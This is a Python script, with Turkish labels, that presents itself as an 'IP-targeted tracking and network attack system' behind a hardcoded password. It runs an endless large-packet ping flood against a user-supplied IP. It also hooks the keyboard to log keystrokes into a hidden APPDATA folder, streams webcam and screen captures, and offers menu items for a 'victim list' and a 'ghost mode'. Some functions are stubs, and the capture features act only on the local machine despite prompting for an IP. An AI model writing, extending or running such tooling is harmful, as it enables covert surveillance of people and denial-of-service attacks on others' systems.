import os
import sys
import time
import keyboard
import pyautogui
import cv2
import numpy as np
import sounddevice as sd
from scipy.io.wavfile import write
import shutil
import threading # Ağ saldırısı için eşzamanlı çalışma sağlar

# --- AYARLAR ---
GIZLI_SIFRE = "berkay19911"
GIZLI_DEPO = os.path.join(os.environ['APPDATA'], "Win_IP_Kasasi")
SALDIRI_AKTIF = False # Saldırıyı durdurmak için kontrol bayrağı

if not os.path.exists(GIZLI_DEPO): os.makedirs(GIZLI_DEPO)

def hedef_ip_al():
    hedef = pyautogui.prompt("İşlem yapılacak Hedef IP adresini girin:", "IP Hedefleme")
    return hedef if hedef else None

def ag_saldirisi_baslat(hedef_ip):
    """Hedef IP'ye sonsuz paket gönderen alt işlem."""
    global SALDIRI_AKTIF
    print(f"\n[!] {hedef_ip} Üzerine Paket Gönderimi Başladı...")
    while SALDIRI_AKTIF:
        # Standart ping saldırısı (boyut: 65500 byte)
        os.system(f"ping {hedef_ip} -l 65500 -n 1 > nul")
        if keyboard.is_pressed('0'):
            SALDIRI_AKTIF = False
            break

def ana_panel():
    global SALDIRI_AKTIF
    while True:
        os.system('cls')
        print("=== E61GT IP-HEDEFLI TAKIP & AG SISTEMI V73 ===")
        print(f"DURUM: HAZIR | YETKI: MASTER")
        print("-" * 55)
        print("[1] AG SALDIRISI (IP)   | [2] SONSUZ KAMERA (IP)")
        print("[3] SONSUZ SES (IP)     | [4] CANLI KLAVYE (IP)")
        print("[6] CANLI EKRAN (IP)    | [7] KURBAN LISTESI")
        print("-" * 55)
        print("[0] KODU KAPAT          | [5] VERILERI TEMIZLE")
        print("[ESC] HAYALET MOD")
        print("-" * 55)

        while True:
            if keyboard.is_pressed('0'): sys.exit()

            # --- 1: AG SALDIRISI (YENI EKLENDI) ---
            elif keyboard.is_pressed('1'):
                hedef = hedef_ip_al()
                if hedef:
                    SALDIRI_AKTIF = True
                    # İşlemi arka planda başlatıyoruz ki klavye dinlemeye devam edebilelim
                    saldiri_thread = threading.Thread(target=ag_saldirisi_baslat, args=(hedef,))
                    saldiri_thread.start()
                    print("\n[+] Saldırı çalışıyor. Durdurmak için '0' tuşuna basılı tutun.")
                    while SALDIRI_AKTIF:
                        if keyboard.is_pressed('0'):
                            SALDIRI_AKTIF = False
                            print("\n[-] Saldırı durduruldu.")
                            time.sleep(1)
                break

            # --- 4: CANLI KLAVYE ---
            elif keyboard.is_pressed('4'):
                hedef = hedef_ip_al()
                if hedef:
                    print(f"\n[!] {hedef} İÇİN KLAVYE AKIŞI... (Durdur: '0')")
                    def on_press(e):
                        with open(os.path.join(GIZLI_DEPO, f"log_{hedef}.txt"), "a") as f:
                            f.write(f"{e.name} ")
                        sys.stdout.write(f"[{e.name}] "); sys.stdout.flush()
                    hook = keyboard.on_press(on_press)
                    while not keyboard.is_pressed('0'): time.sleep(0.1)
                    keyboard.unhook(hook)
                break

            # --- 2: KAMERA ---
            elif keyboard.is_pressed('2'):
                hedef = hedef_ip_al()
                if hedef:
                    cap = cv2.VideoCapture(0)
                    while True:
                        ret, frame = cap.read()
                        if not ret or keyboard.is_pressed('0'): break
                        cv2.imshow(f"KAMERA: {hedef}", frame)
                        cv2.waitKey(1)
                    cap.release(); cv2.destroyAllWindows()
                break

            # --- 6: EKRAN ---
            elif keyboard.is_pressed('6'):
                hedef = hedef_ip_al()
                if hedef:
                    while not keyboard.is_pressed('0'):
                        img = np.array(pyautogui.screenshot())
                        cv2.imshow(f"EKRAN: {hedef}", cv2.cvtColor(img, cv2.COLOR_BGR2RGB))
                        if cv2.waitKey(1) & 0xFF == ord('0'): break
                    cv2.destroyAllWindows()
                break

            elif keyboard.is_pressed('esc'): return
            time.sleep(0.1)

# --- BASLATICI ---
try:
    if pyautogui.password("Sistem Sifresi:", "Admin", mask="*") == GIZLI_SIFRE:
        ana_panel()
    else: sys.exit()
except: sys.exit()
